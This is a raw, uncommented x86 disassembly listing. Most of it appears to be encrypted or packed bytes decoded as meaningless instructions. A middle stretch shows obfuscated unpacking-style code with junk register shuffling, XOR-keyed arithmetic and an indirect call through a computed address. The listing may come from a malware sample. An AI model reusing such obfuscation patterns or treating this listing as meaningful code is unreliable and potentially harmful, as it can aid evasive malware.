  40cd52:	ss fs jge 0x40cd40
  40cd56:	popf   
  40cd57:	mov    edi,0xd2d358d4
  40cd5c:	and    ecx,esp
  40cd5e:	push   ebp
  40cd5f:	ret    0x8fd7
  40cd62:	bound  edi,QWORD PTR [esi]
  40cd64:	push   es
  40cd65:	xlat   BYTE PTR ds:[ebx]
  40cd66:	in     al,dx
  40cd67:	xchg   ecx,eax
  40cd68:	es popf 
  40cd6a:	pop    esi
  40cd6b:	pop    edi
  40cd6c:	cld    
  40cd6d:	fidivr DWORD PTR [ecx-0x7]
  40cd70:	mov    esi,0xaa0dc960
  40cd75:	adc    BYTE PTR [esi-0x7e],ch
  40cd78:	fadd   QWORD PTR [ecx+0x4f]
  40cd7b:	repnz rcr BYTE PTR [esi-0x3a],cl
  40cd7f:	inc    edi
  40cd80:	push   0x11cc539a
  40cd85:	adc    edx,DWORD PTR [ecx]
  40cd87:	sub    eax,0x14f413db
  40cd8c:	test   esi,esp
  40cd8e:	mov    eax,ds:0xc8b0087b
  40cd93:	push   cs
  40cd94:	js     0x40cdb3
  40cd96:	jb     0x40cd63
  40cd98:	cmp    ebx,DWORD PTR [ebx+0x65b6702f]
  40cd9e:	outs   dx,DWORD PTR ds:[esi]
  40cd9f:	add    ch,BYTE PTR [ebx+edx*1+0xf]
  40cda3:	jmp    0x6bee:0xcae48431
  40cdaa:	mov    dl,0xa6
  40cdac:	lods   al,BYTE PTR ds:[esi]
  40cdad:	inc    ecx
  40cdae:	cmp    BYTE PTR [edi-0x77d5fd4d],cl
  40cdb4:	popa   
  40cdb5:	dec    eax
  40cdb6:	daa    
  40cdb7:	je     0x40cdcc
  40cdb9:	cmp    bl,BYTE PTR [ebp+0xa]
  40cdbc:	out    dx,eax
  40cdbd:	push   eax
  40cdbe:	adc    eax,0x8047e5a4
  40cdc3:	sbb    eax,0x8e9832c2
  40cdc8:	mov    ecx,0x26dcf073
  40cdcd:	adc    DWORD PTR [eax+esi*8+0x529cdf2f],0xffffffd3
  40cdd5:	dec    ecx
  40cdd6:	or     DWORD PTR [ecx-0x6f0504f7],edi
  40cddc:	scas   eax,DWORD PTR es:[edi]
  40cddd:	xchg   ebx,eax
  40cdde:	fs xchg ebx,eax
  40cde0:	jg     0x40ce60
  40cde2:	jnp    0x40ce5e
  40cde4:	mov    ch,0x16
  40cde6:	inc    edx
  40cde7:	push   DWORD PTR [ecx+0x2]
  40cdea:	or     eax,0x57266e29
  40cdef:	or     BYTE PTR [eax],0x87
  40cdf2:	(bad)  
  40cdf3:	adc    edi,DWORD PTR [eax]
  40cdf5:	jl     0x40ce03
  40cdf7:	dec    ecx
  40cdf8:	mov    ss,WORD PTR [ecx-0x56]
  40cdfb:	cmp    al,0x20
  40cdfd:	pop    ss
  40cdfe:	loop   0x40cdab
  40ce00:	pop    edi
  40ce01:	test   al,0xfe
  40ce03:	sbb    al,0xf0
  40ce05:	mov    bl,0x84
  40ce07:	adc    DWORD PTR [esi+0x7b],ebx
  40ce0a:	mov    ebx,DWORD PTR [esp+ebx*4]
  40ce0d:	mov    eax,ds:0x661ba691
  40ce12:	out    0xb6,eax
  40ce14:	les    ebp,FWORD PTR [esi+ebp*1+0x151b11b4]
  40ce1b:	jmp    0x582d:0x71c0d914
  40ce22:	jl     0x40ce94
  40ce24:	xor    DWORD PTR [edx+0x19],esi
  40ce27:	push   ebp
  40ce28:	outs   dx,DWORD PTR ds:[esi]
  40ce29:	leave  
  40ce2a:	sub    BYTE PTR [ebp+0x5fe28850],0x5f
  40ce31:	mov    ds:0x69119bc8,eax
  40ce36:	dec    esi
  40ce37:	xor    eax,0x3e767ca4
  40ce3c:	xor    al,BYTE PTR fs:[esi]
  40ce3f:	push   ebx
  40ce40:	scas   al,BYTE PTR es:[edi]
  40ce41:	mov    eax,0x1538f56
  40ce46:	cvtps2pi mm1,QWORD PTR [eax-0x2d]
  40ce4a:	fild   WORD PTR [ebx+0x2dd77e26]
  40ce50:	pop    esp
  40ce51:	sbb    BYTE PTR [ecx-0x18],ch
  40ce54:	clc    
  40ce55:	cmp    eax,0x29da6254
  40ce5a:	mov    ecx,0x871d96db
  40ce5f:	mov    ds:0x49a3aaf0,eax
  40ce64:	cmp    edx,DWORD PTR [eax+0x76424fb]
  40ce6a:	(bad)  
  40ce6c:	jns    0x40ceaf
  40ce6e:	xchg   edx,eax
  40ce6f:	out    0x32,al
  40ce71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce72:	jb     0x40ce4e
  40ce74:	clc    
  40ce75:	sbb    eax,0x54979f9f
  40ce7a:	test   DWORD PTR [ecx-0x8],esp
  40ce7d:	rcl    edx,1
  40ce7f:	pop    ds
  40ce80:	mov    ?,ebp
  40ce82:	fisubr DWORD PTR [ebx-0x7efa151c]
  40ce88:	pop    edx
  40ce89:	cmp    ah,BYTE PTR [edi-0x36]
  40ce8c:	call   0xab8f:0x838fa706
  40ce93:	stc    
  40ce94:	dec    edx
  40ce95:	in     eax,0xee
  40ce97:	xor    BYTE PTR [ecx+eax*4+0x6e],al
  40ce9b:	add    DWORD PTR [ebx+0x78],ecx
  40ce9e:	adc    eax,0x761cc479
  40cea3:	adc    BYTE PTR [ecx+0x105fe6fd],al
  40cea9:	mov    ah,0xbd
  40ceab:	mov    esi,ss
  40cead:	and    BYTE PTR [ebx],dh
  40ceaf:	push   edx
  40ceb0:	int    0xa0
  40ceb2:	or     BYTE PTR [esi-0x7c],ah
  40ceb5:	sbb    esi,DWORD PTR [ebp+ebp*8+0x53700713]
  40cebc:	sbb    edi,eax
  40cebe:	cmovg  esi,DWORD PTR [ecx-0xff1ce43]
  40cec5:	cli    
  40cec6:	ja     0x40cf2a
  40cec8:	pop    eax
  40cec9:	sub    eax,0x3f70ab06
  40cece:	inc    edx
  40cecf:	mov    edx,0x7d1c7280
  40ced4:	cmp    BYTE PTR [edx],ah
  40ced6:	mov    dh,0x6d
  40ced8:	or     eax,esi
  40ceda:	stos   BYTE PTR es:[edi],al
  40cedb:	mov    eax,eax
  40cedd:	adc    al,0xc2
  40cedf:	cld    
  40cee0:	add    ah,BYTE PTR [edx]
  40cee2:	add    dh,BYTE PTR [esi]
  40cee4:	cmp    esp,ecx
  40cee6:	sub    edx,DWORD PTR [ebx+0x53c39e8a]
  40ceec:	mov    ah,0xf7
  40ceee:	mov    dh,0x47
  40cef0:	cld    
  40cef1:	xchg   DWORD PTR [ebx+eiz*1],eax
  40cef4:	mov    DWORD PTR [edx-0x67],esi
  40cef7:	scas   eax,DWORD PTR es:[edi]
  40cef8:	and    bl,ah
  40cefa:	addr16 jle 0x40cea4
  40cefd:	scas   al,BYTE PTR es:[edi]
  40cefe:	pop    ebp
  40ceff:	in     al,0x45
  40cf01:	mov    al,ds:0x6e2eea7e
  40cf06:	jne    0x40cef7
  40cf08:	popa   
  40cf09:	sub    cl,bh
  40cf0b:	enter  0x3faf,0x56
  40cf0f:	and    DWORD PTR [edx+0x31],ebp
  40cf12:	pop    ebx
  40cf13:	xchg   ebp,eax
  40cf14:	inc    edi
  40cf15:	inc    esp
  40cf16:	xchg   ebx,eax
  40cf17:	push   ecx
  40cf18:	ret    
  40cf19:	fisttp DWORD PTR [ebx+0x5a]
  40cf1c:	loope  0x40ceb2
  40cf1e:	call   0xc2efa178
  40cf23:	cmp    al,0x72
  40cf25:	loopne 0x40cf0c
  40cf27:	ins    DWORD PTR es:[edi],dx
  40cf28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf29:	adc    ebp,0x1d6b3452
  40cf2f:	sahf   
  40cf30:	add    bh,ch
  40cf32:	xchg   esi,eax
  40cf33:	(bad)  
  40cf34:	pinsrw mm6,WORD PTR [ecx],0x12
  40cf38:	sub    dl,BYTE PTR [ebx+edx*8]
  40cf3b:	and    BYTE PTR [ebp-0x2dd77bf9],ch
  40cf41:	mov    edi,0x3f13bbed
  40cf46:	sti    
  40cf47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf48:	fdivr  st(2),st
  40cf4a:	int3   
  40cf4b:	mov    edi,0x84eb0346
  40cf50:	pop    ds
  40cf51:	fwait
  40cf52:	test   eax,0xa4ef7093
  40cf57:	aam    0x53
  40cf59:	imul   ebp,DWORD PTR [edi+0x5c58f827],0xc625a721
  40cf63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf64:	pmaddwd mm3,QWORD PTR cs:[edx+ebp*4+0x793f24f8]
  40cf6d:	jle    0x40cf2b
  40cf6f:	imul   edi,DWORD PTR [ebx-0x54],0xffffffc8
  40cf73:	mov    al,ds:0xf14d3d51
  40cf78:	rol    bh,cl
  40cf7a:	mov    ah,0x50
  40cf7c:	test   DWORD PTR fs:[edx-0x3d],0x8b3ea629
  40cf84:	call   0xb374d5d
  40cf89:	mov    ebx,esi
  40cf8b:	pop    es
  40cf8c:	add    al,0xd7
  40cf8e:	sub    BYTE PTR [ebx+0x60ccc8db],0xb7
  40cf95:	ins    DWORD PTR es:[edi],dx
  40cf96:	inc    eax
  40cf97:	adc    eax,0x1ec5c1c0
  40cf9c:	pop    ax
  40cf9e:	cmp    BYTE PTR [edx+0x12af8860],ah
  40cfa4:	js     0x40cf54
  40cfa6:	jmp    0x40cfcb
  40cfa8:	inc    esp
  40cfa9:	and    ch,BYTE PTR [ebx+eiz*2]
  40cfac:	add    eax,0xb8658498
  40cfb1:	imul   ecx,DWORD PTR [ecx+eiz*1],0x88ac6a1e
  40cfb8:	jmp    0xa5b27f46
  40cfbd:	xor    eax,0x3a86a6da
  40cfc2:	pop    esp
  40cfc3:	mov    BYTE PTR [esi+eax*2-0x3f],ch
  40cfc7:	std    
  40cfc8:	mov    dl,0xf1
  40cfca:	jge    0x40cfc9
  40cfcc:	repz and al,0x6b
  40cfcf:	mov    ebp,0xaddcac5e
  40cfd4:	mov    edi,0xa3f9b4b3
  40cfd9:	mov    ebp,0x493c9ee0
  40cfde:	jle    0x40d028
  40cfe0:	or     BYTE PTR [eax+0x1d],ch
  40cfe3:	jbe    0x40cfe1
  40cfe5:	bound  eax,QWORD PTR [edx-0x5a]
  40cfe8:	das    
  40cfe9:	adc    BYTE PTR [esi-0x714ce885],dl
  40cfef:	pop    ecx
  40cff0:	cmp    ecx,DWORD PTR [edi-0x25]
  40cff3:	mov    al,ds:0x351a5bfe
  40cff8:	cmp    BYTE PTR [ecx],bh
  40cffa:	jl     0x40d015
  40cffc:	scas   eax,DWORD PTR es:[edi]
  40cffd:	sbb    ch,BYTE PTR [edx+0x7948bac2]
  40d003:	out    0x2,al
  40d005:	mov    esi,0xe354833b
  40d00a:	cmp    al,0x42
  40d00c:	xchg   edi,eax
  40d00d:	lds    edx,FWORD PTR [edi+0x66]
  40d010:	retf   0xe090
  40d013:	enter  0x48b1,0xb1
  40d017:	cdq    
  40d018:	fwait
  40d019:	pop    esi
  40d01a:	jg     0x40cfc4
  40d01c:	adc    cl,ah
  40d01e:	ins    BYTE PTR es:[edi],dx
  40d01f:	icebp  
  40d020:	add    BYTE PTR [ebp-0x2028ca1e],bh
  40d026:	jp     0x40d03f
  40d028:	test   al,0x7
  40d02a:	mov    cl,BYTE PTR [ebx-0x2e927ee4]
  40d030:	popa   
  40d031:	jmp    0x5b2f736
  40d036:	adc    eax,0xbbaa3644
  40d03b:	out    dx,al
  40d03c:	jns    0x40d0a4
  40d03e:	mov    al,ds:0xb5349f09
  40d043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d044:	lahf   
  40d045:	mov    esi,0x7003adbc
  40d04a:	imul   ebx,esi,0x51
  40d04d:	xor    al,0xc5
  40d04f:	dec    ecx
  40d050:	call   0xabb2:0xd78fd697
  40d057:	inc    esp
  40d058:	push   ecx
  40d059:	mov    ss,WORD PTR [eax-0x74]
  40d05c:	inc    edx
  40d05d:	inc    ecx
  40d05e:	adc    ah,BYTE PTR [eax-0x5ac89de8]
  40d064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d065:	outs   dx,BYTE PTR ds:[esi]
  40d066:	out    0x68,al
  40d068:	leave  
  40d069:	ins    DWORD PTR es:[edi],dx
  40d06a:	retf   
  40d06b:	fmul   QWORD PTR [ebx-0x25]
  40d06e:	fisttp QWORD PTR [ebp-0x290d5009]
  40d074:	in     eax,0x65
  40d076:	aaa    
  40d077:	pusha  
  40d078:	cmp    ebp,edi
  40d07a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d07b:	add    eax,0xbc9e5681
  40d080:	test   al,0xeb
  40d082:	adc    eax,0xaded931c
  40d087:	push   esp
  40d088:	jp     0x40d0b7
  40d08a:	scas   eax,DWORD PTR es:[edi]
  40d08b:	(bad)  
  40d08c:	outs   dx,BYTE PTR ds:[esi]
  40d08d:	call   0x5767bb98
  40d092:	sub    bl,BYTE PTR [edx-0x24]
  40d095:	rcl    BYTE PTR [edi+0x1014b93f],0x9d
  40d09c:	fnstsw WORD PTR [edx]
  40d09e:	mov    edx,0x518ccc6d
  40d0a3:	cld    
  40d0a4:	(bad)  
  40d0a5:	dec    ebp
  40d0a6:	push   ss
  40d0a7:	push   esp
  40d0a8:	ror    ebx,1
  40d0aa:	xchg   ebx,eax
  40d0ab:	and    al,0xf3
  40d0ad:	or     bh,BYTE PTR [esp+esi*1+0x61]
  40d0b1:	sbb    BYTE PTR [esi+ecx*1+0x4bec25d7],bl
  40d0b8:	mov    ch,0xa0
  40d0ba:	inc    DWORD PTR [ecx-0x2d]
  40d0bd:	mov    ecx,ebp
  40d0bf:	mov    bl,0x61
  40d0c1:	add    eax,0x906e0cb0
  40d0c6:	ins    DWORD PTR es:[edi],dx
  40d0c7:	call   0xfd9ba7e2
  40d0cc:	retf   0x49d9
  40d0cf:	dec    edi
  40d0d0:	jno    0x40d062
  40d0d2:	or     dh,BYTE PTR [esi+0x13dfe14c]
  40d0d8:	ror    BYTE PTR [ebp+0x26ecaeed],1
  40d0de:	retf   
  40d0df:	add    BYTE PTR [ecx-0x4e],ch
  40d0e2:	inc    edi
  40d0e3:	int    0xd6
  40d0e5:	fisub  DWORD PTR [ebx-0x41152e10]
  40d0eb:	imul   eax,DWORD PTR [ebx],0xffffff96
  40d0ee:	jbe    0x40d150
  40d0f0:	(bad)  
  40d0f1:	test   DWORD PTR [eax+esi*2-0x54],edi
  40d0f5:	pop    ss
  40d0f6:	(bad)  
  40d0f7:	repz sub dh,dl
  40d0fa:	fstp   TBYTE PTR [ebx+eiz*1]
  40d0fd:	lahf   
  40d0fe:	dec    edx
  40d0ff:	fs mov cl,0x8b
  40d102:	xchg   esp,eax
  40d103:	arpl   WORD PTR [ebp+0x59b870d9],dx
  40d109:	ss mov bl,0x96
  40d10c:	adc    DWORD PTR [edx-0x60652462],0x900c9580
  40d116:	xchg   esp,eax
  40d117:	dec    ecx
  40d118:	fsubr  QWORD PTR [esi]
  40d11a:	clc    
  40d11b:	inc    esi
  40d11c:	push   ebp
  40d11d:	pop    ss
  40d11e:	mov    BYTE PTR [ecx-0x75],ch
  40d121:	xor    eax,0x9ed68a6c
  40d126:	dec    ebx
  40d127:	or     ecx,edx
  40d129:	push   cs
  40d12a:	xchg   edx,eax
  40d12b:	jb     0x16f8f1e1
  40d131:	test   eax,0x512a97ed
  40d136:	mov    al,0xb5
  40d138:	fsubr  DWORD PTR [edx+0x436f228f]
  40d13e:	mov    edx,0x53d7b4d7
  40d143:	mov    bh,0xa2
  40d145:	mov    BYTE PTR gs:[ebp+0x323a4140],dl
  40d14c:	into   
  40d14d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d14e:	dec    edx
  40d14f:	push   cs
  40d150:	out    0x43,eax
  40d152:	jecxz  0x40d1d1
  40d154:	jl     0x40d180
  40d156:	pop    edi
  40d157:	add    al,0x87
  40d159:	repz and esi,DWORD PTR [edi+0x6cf9abcd]
  40d160:	clc    
  40d161:	cmp    al,0x4c
  40d163:	lds    esi,FWORD PTR [esi+0x19]
  40d166:	fsubr  QWORD PTR [edx+edx*1-0x7b8c9443]
  40d16d:	or     BYTE PTR [eax-0x8],ch
  40d170:	cmp    BYTE PTR [esi+edx*4-0x38],dl
  40d174:	add    edx,DWORD PTR [ecx-0x6f629c4]
  40d17a:	jo     0x40d18c
  40d17c:	daa    
  40d17d:	inc    edi
  40d17e:	sub    ecx,DWORD PTR [eax-0x7c1b17d9]
  40d184:	shl    DWORD PTR [ecx-0x54],1
  40d187:	cmc    
  40d188:	mov    esp,0x6ac4154b
  40d18d:	cmp    cl,BYTE PTR ds:0xe5545830
  40d193:	xor    BYTE PTR [edi-0x5ee98f17],bh
  40d199:	lea    esi,[edx+esi*8]
  40d19c:	loop   0x40d1ee
  40d19e:	mov    esi,0x2126e973
  40d1a3:	mov    eax,0x48f91a20
  40d1a8:	jge    0x40d154
  40d1aa:	sub    al,al
  40d1ac:	adc    DWORD PTR [edi-0x44e75f2c],edi
  40d1b2:	jecxz  0x40d215
  40d1b4:	inc    eax
  40d1b5:	fadd   QWORD PTR [esi]
  40d1b7:	rol    edx,cl
  40d1b9:	ss (bad) 
  40d1bb:	xor    DWORD PTR ds:0x74d78bb2,ecx
  40d1c1:	push   eax
  40d1c2:	xchg   ecx,eax
  40d1c3:	dec    esp
  40d1c4:	cwde   
  40d1c5:	(bad)  
  40d1c6:	std    
  40d1c7:	mov    esi,DWORD PTR [ecx-0x2d]
  40d1ca:	data16 mov ah,al
  40d1cd:	leave  
  40d1ce:	les    ecx,FWORD PTR [ebp-0x33]
  40d1d1:	inc    esi
  40d1d2:	sbb    al,0x56
  40d1d4:	mov    ch,0xe2
  40d1d6:	repz jle 0x40d159
  40d1d9:	sbb    ebx,DWORD PTR ds:0x142a5058
  40d1df:	div    BYTE PTR [eax-0x928a8b4]
  40d1e5:	stc    
  40d1e6:	xor    ch,cl
  40d1e8:	fdivr  DWORD PTR [ebp-0x6a]
  40d1eb:	push   cs
  40d1ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1ed:	pop    esp
  40d1ee:	pusha  
  40d1ef:	add    eax,0x7524e243
  40d1f4:	xchg   ebx,eax
  40d1f5:	add    DWORD PTR [eax-0x5d],ecx
  40d1f8:	int    0x1d
  40d1fa:	retf   
  40d1fb:	mov    ah,0x72
  40d1fd:	aad    0xc3
  40d1ff:	add    dh,cl
  40d201:	js     0x40d1f2
  40d203:	fcom   QWORD PTR [edi-0x367ad7a5]
  40d209:	test   ch,dl
  40d20b:	or     eax,0x2a6f5ae1
  40d210:	mov    eax,eax
  40d212:	jmp    0xf0d1:0x6236b5a8
  40d219:	bound  ebp,QWORD PTR [esp+ebp*2-0x14]
  40d21d:	inc    eax
  40d21e:	xor    ch,BYTE PTR [ebx+0x2db9e992]
  40d224:	pop    edi
  40d225:	icebp  
  40d226:	push   ds
  40d227:	outs   dx,DWORD PTR ds:[esi]
  40d228:	pushf  
  40d229:	and    cl,BYTE PTR [eax+edx*8+0x81da0b2]
  40d230:	xchg   edx,eax
  40d231:	stc    
  40d232:	out    0xcc,al
  40d234:	out    dx,eax
  40d235:	pop    ss
  40d236:	sbb    al,0xef
  40d238:	mov    ah,0xba
  40d23a:	mov    edi,0xe7a5dc80
  40d23f:	imul   edx,DWORD PTR [esi-0x12],0x82c8b3da
  40d246:	sbb    eax,edx
  40d248:	cwde   
  40d249:	xor    dh,cl
  40d24b:	out    dx,al
  40d24c:	jp     0x40d2c1
  40d24e:	ja     0x40d1d7
  40d250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d251:	push   ss
  40d252:	and    eax,0xd3a981fc
  40d257:	xlat   BYTE PTR fs:[ebx]
  40d259:	push   ecx
  40d25a:	adc    ah,ah
  40d25c:	test   al,0xa6
  40d25e:	rcr    BYTE PTR [ebx],1
  40d260:	jg     0x40d29d
  40d262:	add    ch,BYTE PTR [edi+0x647a7fb5]
  40d268:	and    al,0x48
  40d26a:	mov    esi,0xf92308c9
  40d26f:	sub    BYTE PTR [esi+0x6c59bf45],al
  40d275:	xchg   DWORD PTR [ebp-0x5dc58260],eax
  40d27b:	pop    ebp
  40d27c:	and    ebp,ebp
  40d27e:	rcl    BYTE PTR [eax],1
  40d280:	arpl   WORD PTR [eax],dx
  40d282:	pop    esp
  40d283:	jge    0x40d2be
  40d285:	mov    edi,0x9dd83b34
  40d28a:	in     eax,dx
  40d28b:	dec    esp
  40d28c:	dec    esp
  40d28d:	jnp    0x40d277
  40d28f:	popfw  
  40d291:	ret    0xe09b
  40d294:	mov    al,0x56
  40d296:	out    dx,ax
  40d298:	mov    eax,DWORD PTR [ebp-0x1c]
  40d29b:	test   eax,eax
  40d29d:	je     0x40d339
  40d2a3:	mov    DWORD PTR [ebp-0x20],0x0
  40d2aa:	push   edx
  40d2ab:	pop    eax
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x430a2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d496
  40d43c:	mov    al,ds:0x2a1a8f3c
  40d441:	jnp    0x40d4be
  40d443:	clc    
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	test   al,0xf1
  40d44a:	inc    ebx
  40d44b:	sub    ebp,ebp
  40d44d:	xchg   ecx,eax
  40d44e:	pop    ds
  40d44f:	push   eax
  40d451:	test   al,0xfa
  40d453:	mov    ebx,0xd1e5f6ea
  40d458:	das    
  40d459:	aad    0xf5
  40d45b:	int3   
  40d45c:	dec    esp
  40d45d:	push   es
  40d45e:	shr    DWORD PTR [eax-0x7957929a],1
  40d464:	xor    ecx,eax
  40d466:	enter  0x37a4,0x1a
  40d46a:	hlt    
  40d46b:	retf   
  40d46c:	(bad)  
  40d46d:	outs   dx,BYTE PTR ds:[esi]
  40d46e:	add    ch,BYTE PTR [eax-0x7b]
  40d471:	jl     0x40d420
  40d473:	mov    eax,0x425b8871
  40d478:	pusha  
  40d479:	pop    es
  40d47a:	shl    DWORD PTR [ecx],cl
  40d47c:	cs pop eax
  40d47e:	daa    
  40d47f:	or     dh,cl
  40d481:	sar    BYTE PTR [esi],1
  40d483:	mov    dh,0xbd
  40d485:	std    
  40d486:	test   BYTE PTR [ebx-0x26cce49],dh
  40d48c:	jmp    0x5adcc10b
  40d491:	jl     0x40d4d9
  40d493:	lahf   
  40d494:	pop    eax
  40d495:	or     al,0x27
  40d497:	xchg   esp,eax
  40d498:	stc    
  40d499:	or     DWORD PTR [esi+0x51621b4a],edi
  40d49f:	cmp    esp,DWORD PTR [edi]
  40d4a1:	add    DWORD PTR [edx+0x117e7e9],ebx
  40d4a7:	xchg   ebx,eax
  40d4a8:	sub    ebx,DWORD PTR [esp+edx*1]
  40d4ab:	mov    ds:0xeeaa2521,eax
  40d4b0:	call   0x569f:0xe8ee689f
  40d4b7:	mov    al,0xf0
  40d4b9:	fs sub bh,dl
  40d4bc:	mov    ch,0x3
  40d4be:	scas   al,BYTE PTR es:[edi]
  40d4bf:	dec    bp
  40d4c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4c2:	call   0xa9e1:0x8ab639cd
  40d4c9:	push   esp
  40d4ca:	arpl   cx,bx
  40d4cc:	mov    edi,0xf17b22c9
  40d4d1:	in     al,0xa4
  40d4d3:	imul   ebx,ecx,0xffffffca
  40d4d6:	mov    dh,0x6e
  40d4d8:	mul    DWORD PTR [esi-0x70add9f8]
  40d4de:	test   DWORD PTR [ecx],esi
  40d4e0:	mov    eax,0xde526e0e
  40d4e5:	adc    DWORD PTR [ebx],esi
  40d4e7:	test   DWORD PTR [edx-0x3d],0x39300ecc
  40d4ee:	sub    ecx,eax
  40d4f0:	outs   dx,DWORD PTR ds:[esi]
  40d4f1:	adc    DWORD PTR [edx+esi*1-0x7f],0xffffffae
  40d4f6:	test   eax,0x414f019
  40d4fb:	hlt    
  40d4fc:	xor    DWORD PTR [eax+ebx*1+0x193c1794],edi
  40d503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d504:	ins    BYTE PTR es:[edi],dx
  40d505:	adc    al,0xcf
  40d507:	jmp    0x63ae:0x9b3a144e
  40d50e:	out    0x5f,eax
